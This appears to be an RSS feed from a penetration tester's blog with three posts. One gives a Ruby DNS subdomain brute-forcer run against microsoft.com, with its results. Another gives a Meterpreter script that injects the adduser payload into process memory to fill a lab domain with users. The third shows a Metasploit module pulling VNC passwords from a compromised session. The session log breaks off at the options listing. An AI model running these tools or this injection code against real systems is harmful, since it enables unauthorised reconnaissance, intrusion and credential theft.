<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>scripting on malicious.link</title>
    <link>https://malicious.link/categories/scripting/</link>
    <description>Recent content in scripting on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 19 Feb 2014 23:33:50 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/categories/scripting/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Iterative DNS Brute Forcing</title>
      <link>https://malicious.link/post/2014/2014-02-19-iterative-dns-brute-forcing/</link>
      <pubDate>Wed, 19 Feb 2014 23:33:50 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/2014-02-19-iterative-dns-brute-forcing/</guid>
      <description>&lt;p&gt;Everyone has their list of hostnames they brute force domains with. In my last post I even mentioned a few ways to use one with XARGS or PARALLEL. But one fact about wordlist brute forcing is that there is no &amp;ldquo;one list to rule them all&amp;rdquo;.  But over the years of doing DNS record collection I have noticed one thing, most domains have a large number of short hostnames that are easy to remember, usually 4 characters or less.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m sure you already know where I&amp;rsquo;m going with this, I wanted to brute force all possible hostnames up to 4 characters. For a long time I struggled with coding this, but couldn&amp;rsquo;t wrap my head around it. I would come back to it every so often, finally a few days ago I happened upon a script on gist: &lt;a href=&#34;https://gist.github.com/petehamilton/4755855&#34;&gt;https://gist.github.com/petehamilton/4755855&lt;/a&gt; that suited my needs perfectly.&lt;/p&gt;
&lt;p&gt;I modified it to suite my needs (just use the yield method) and here is what I ended up with (remember DNS is case insensitive):&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Notice:&lt;/strong&gt; This script doesn&amp;rsquo;t end, it will keep doing lookups on longer and longer hostnames until you hit CTRL-C&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env ruby

#
## Brute code stolen form: https://gist.github.com/petehamilton/4755855
#

@domain = &#39;microsoft.com&#39;

def result?(sub)
	results = %x(dig +noall #{sub}.#{@domain} +answer)
	if results != &amp;quot;&amp;quot;
		puts &amp;quot;============================&amp;quot;
		puts &amp;quot;FOUND: \t#{sub}&amp;quot;
		puts &amp;quot;============================&amp;quot;
		puts &amp;quot;#{results}&amp;quot;
		puts &amp;quot;============================&amp;quot;
	end
	1 == 2
end

def crack_yielding(chars)
	crack_yield(chars){ |p|
		return p if result?(p)
	}
end


def crack_yield(chars)
	chars.each { |c| yield c }

	crack_yield(chars) { |c|
		chars.each do |x|
			yield c + x
		end
	}
end

chars = (&#39;a&#39;..&#39;z&#39;).to_a
(0..9).each {|x| chars &amp;lt;&amp;lt; x.to_s} 

crack_yielding(chars)

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This worked but it was slow, so I sped it up using methods that I talked about in my last post and a quick modification:&lt;/p&gt;
&lt;p&gt;I used this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env ruby

#
## Brute code stolen form: https://gist.github.com/petehamilton/4755855
#

def result?(sub)
	puts sub	
	1 == 2
end

def crack_yielding(chars)
	crack_yield(chars){ |p|
		return p if result?(p)
	}
end


def crack_yield(chars)
	chars.each { |c| yield c }

	crack_yield(chars) { |c|
		chars.each do |x|
			yield c + x
		end
	}
end

chars = (&#39;a&#39;..&#39;z&#39;).to_a
(0..9).each {|x| chars &amp;lt;&amp;lt; x.to_s} 

crack_yielding(chars)

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which just prints all the possibilities:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a
b
c
d
e
f
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and piped it into parallel + dig:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ruby brutelist.rb | parallel -j100 dig +noall {}.microsoft.com +answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and got the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c.microsoft.com.	2	IN	CNAME	c.microsoft.akadns.net.
c.microsoft.akadns.net.	499	IN	A	65.55.58.184
e.microsoft.com.	3599	IN	A	191.234.1.50
g.microsoft.com.	2798	IN	CNAME	g.msn.com.
g.msn.com.		99	IN	CNAME	g.msn.com.nsatc.net.
g.msn.com.nsatc.net.	148	IN	A	131.253.34.154
i.microsoft.com.	779	IN	CNAME	i.toggle.www.ms.akadns.net.
i.toggle.www.ms.akadns.net. 44	IN	CNAME	i.g.www.ms.akadns.net.
i.g.www.ms.akadns.net.	225	IN	CNAME	i.microsoft.com.edgesuite.net.
i.microsoft.com.edgesuite.net. 116 IN	CNAME	a1475.g.akamai.net.
a1475.g.akamai.net.	16	IN	A	23.45.65.26
a1475.g.akamai.net.	16	IN	A	23.45.65.33
m.microsoft.com.	3599	IN	CNAME	origin.mobile.ms.akadns.net.
origin.mobile.ms.akadns.net. 299 IN	A	65.55.186.235
s.microsoft.com.	3599	IN	CNAME	reroute.microsoft.com.
reroute.microsoft.com.	3599	IN	A	65.55.58.201
reroute.microsoft.com.	3599	IN	A	64.4.11.37
cs.microsoft.com.	81	IN	CNAME	wedcs.trafficmanager.net.
wedcs.trafficmanager.net. 7	IN	CNAME	wedcseus.cloudapp.net.
wedcseus.cloudapp.net.	8	IN	A	137.116.48.250
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Happy bruting. Both scripts can be found on my gists page:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Domain version: &lt;a href=&#34;https://gist.github.com/mubix/9107284&#34;&gt;https://gist.github.com/mubix/9107284&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Parallel version: &lt;a href=&#34;https://gist.github.com/mubix/9107276&#34;&gt;https://gist.github.com/mubix/9107276&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Populating Your Virtual Victim Domain</title>
      <link>https://malicious.link/post/2011/2011-08-20-populating-your-virtual-victim-domain/</link>
      <pubDate>Sat, 20 Aug 2011 19:14:53 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-08-20-populating-your-virtual-victim-domain/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Update 1&lt;/strong&gt;: No this doesn&amp;rsquo;t need to be in memory since you control the system but it was a fun challenge&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update 2&lt;/strong&gt;: The info from the &amp;lsquo;adduser&amp;rsquo; payload says &amp;lsquo;&lt;em&gt;Create a new user and add them to local administration group&lt;/em&gt;&amp;rsquo; - I&amp;rsquo;m guessing since I ran this on a DC is why I didn&amp;rsquo;t notice this but it is something to keep in mind when running this script.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update 3&lt;/strong&gt;: Here is a powershell way of doing things from a CSV, you can do some passwords in the CSV and keep it for reference too. I think this is the best solution I&amp;rsquo;ve found to inlude mine: &lt;a href=&#34;http://unlockpowershell.wordpress.com/2010/10/12/creating-random-users-for-a-domain/&#34;&gt;http://unlockpowershell.wordpress.com/2010/10/12/creating-random-users-for-a-domain/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Adding users to a domain that you create for learning, training, or just for testing things out on can be quite tedious. Most of the time I just put a few users to simulate the different &amp;lsquo;levels&amp;rsquo; I need for my testing. However that doesn&amp;rsquo;t really give someone you&amp;rsquo;re training much to think about, i.e. It&amp;rsquo;s really easy to identify the &amp;lsquo;interesting&amp;rsquo; users when there are only a couple to pick from.&lt;/p&gt;
&lt;p&gt;I am certainly not the first one to solve this problem:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.petri.co.il/create_users_for_testing_purposes.htm&#34;&gt;http://www.petri.co.il/create_users_for_testing_purposes.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.commandlinekungfu.com/2010/07/episode-104-fricken-users.html&#34;&gt;http://blog.commandlinekungfu.com/2010/07/episode-104-fricken-users.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://twitter.com/#!/Carlos_Perez/status/71373112494661632&#34;&gt;https://twitter.com/#!/Carlos_Perez/status/71373112494661632&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These work perfectly and are all really easy. The problem for me is that with some the username is too similar and/or the passwords are the same/similar.&lt;/p&gt;
&lt;p&gt;Well, of course I had to do it in Metasploit. (No, not everything has to be in Metasploit, but in this instance it actually helps a lot and you&amp;rsquo;ll see why in a sec)&lt;/p&gt;
&lt;p&gt;Easiest way to get a bunch of random users is to download a list of names, I used this one:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://packetstormsecurity.org/files/32083/other-names.gz.html&#34;&gt;http://packetstormsecurity.org/files/32083/other-names.gz.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And of course you need passwords too, and there isn&amp;rsquo;t a better list than the RockYou list. Skull Security has it over here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.skullsecurity.org/wiki/index.php/Passwords&#34;&gt;http://www.skullsecurity.org/wiki/index.php/Passwords&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL:DR;&lt;/strong&gt; You can download the Meterpreter script here: &lt;a href=&#34;https://gist.github.com/mubix/8215113&#34;&gt;addusers.rb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Start off by importing all the names and passwords into arrays we can manipulate easier:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;namefile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;other-names.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
passwordfile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rockyou.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
usercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;

names &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
namefile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each_line &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
	names &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chomp
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;

passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
passwordfile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each_line &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
	passwords &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chomp
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &amp;lsquo;usercount&amp;rsquo; variable will be used for out loop on how many users to create. Next, just to shake things up we create another array of common suffixes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;datesnum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
	datesnum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; x
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;

(&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
	datesnum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; x
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;

(&lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2013&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
	datesnum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; x
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now to loop through the account creation, and since I&amp;rsquo;m not a big fan of running cmd.exe (staying in memory is one of the staples of Meterpreter) we&amp;rsquo;ll do it by injecting $usercount amount of the windows/adduser payload into our current process.&lt;/p&gt;
&lt;p&gt;For usernames I take a random name and use it&amp;rsquo;s first letter, and then another random selection for the rest. This makes it look like a first initial + last name username scheme.&lt;/p&gt;
&lt;p&gt;For passwords I throw a bit of twist in there I randomly select to have a &amp;lsquo;bad/ok/good&amp;rsquo; password and use just a random selection, random selection + a date or number we generated earlier, or a double random selection put together, respectively.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;usercount)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
	fname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; names&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(names&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
	lname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; names&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(names&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
	goodpass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
	password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; goodpass
	&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
		passwords&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(passwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;passwords&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(passwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}#{&lt;/span&gt;datesnum&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(datesnum&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;passwords&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(passwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}#{&lt;/span&gt;passwords&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rand(passwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size)&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
	username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;fname&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;].&lt;/span&gt;chr&lt;span style=&#34;color:#e6db74&#34;&gt;}#{&lt;/span&gt;lname&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; goodpass
	&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
		puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;username&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; has a bad password of &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
		puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;username&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; has an ok password of &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
		puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;username&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; has a good password of &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
	
	payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;windows/adduser&amp;#39;&lt;/span&gt;
	pay &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;payloads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(payload)

	pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;USER&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; username
	pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PASS&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; password

	raw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate
	host_process &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getpid, &lt;span style=&#34;color:#66d9ef&#34;&gt;PROCESS_ALL_ACCESS&lt;/span&gt;)
	mem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; host_process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;allocate(raw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (raw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;))
	host_process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(mem, raw)
	host_process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(mem, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
	print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;username&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; created with password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Know what&amp;rsquo;s great about this? With just a few changed lines you can slam all of the user creation payloads into one binary and have a binary you can run any time you want to gen a bunch of users quickly. (Good to mess with CCDC blue teams too!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit VNC Password Extraction</title>
      <link>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</link>
      <pubDate>Mon, 21 Mar 2011 02:12:29 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://carnal0wnage.blogspot.com/2011/03/vnc-passwords-and-metasploit-and-des.html&#34;&gt;Chris Gates wrote a blog post&lt;/a&gt; about the &amp;lsquo;getvncpw&amp;rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&amp;rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&amp;rsquo;t get a chance to.&lt;/p&gt;
&lt;p&gt;Yesterday I saw this ticket: &lt;a href=&#34;https://www.metasploit.com/redmine/issues/3183&#34;&gt;https://www.metasploit.com/redmine/issues/3183&lt;/a&gt; and thought to myself: &amp;ldquo;Thats definitely within my coding ability to contribute a patch for&amp;rdquo;. After almost 15 hours of coding between 9 pm on Saturday and 8 pm on Sunday. It went far and beyond just adding in a bit of code to support UltraVNC.&lt;/p&gt;
&lt;p&gt;changelog:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Complete rewrite as a post module instead of a meterpreter script&lt;/li&gt;
&lt;li&gt;Passwords of less than 8 characters are correctly padded (&lt;a href=&#34;https://www.metasploit.com/redmine/projects/framework/repository/revisions/12033&#34;&gt;thanks jduck&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;UltraVNC checks added&lt;/li&gt;
&lt;li&gt;TightVNC checks added for both VNC and it&amp;rsquo;s control console&lt;/li&gt;
&lt;li&gt;Made it very simple to add new checks in either the registry or in a file&lt;/li&gt;
&lt;li&gt;Output is a bit more verbose (lets you know something is happening&lt;/li&gt;
&lt;li&gt;Reports authentication credentials found to database&lt;/li&gt;
&lt;li&gt;Identifies the port that VNC is running on as well&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It isn&amp;rsquo;t in the metasploit trunk so until/if if gets added you can get it here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/8215705&#34;&gt;enum_vnc_pw.rb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me.&lt;/p&gt;
&lt;p&gt;Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &amp;gt; getuid
Server username: XPBASELINEAdministrator
meterpreter &amp;gt; background
msf exploit(handler) &amp;gt; use post/windows/gather/enum_vnc_pw 
msf post(enum_vnc_pw) &amp;gt; set SESSION 1
SESSION =&amp;gt; 1
msf post(enum_vnc_pw) &amp;gt; show options

Module options (post/windows/gather/enum_vnc_pw):

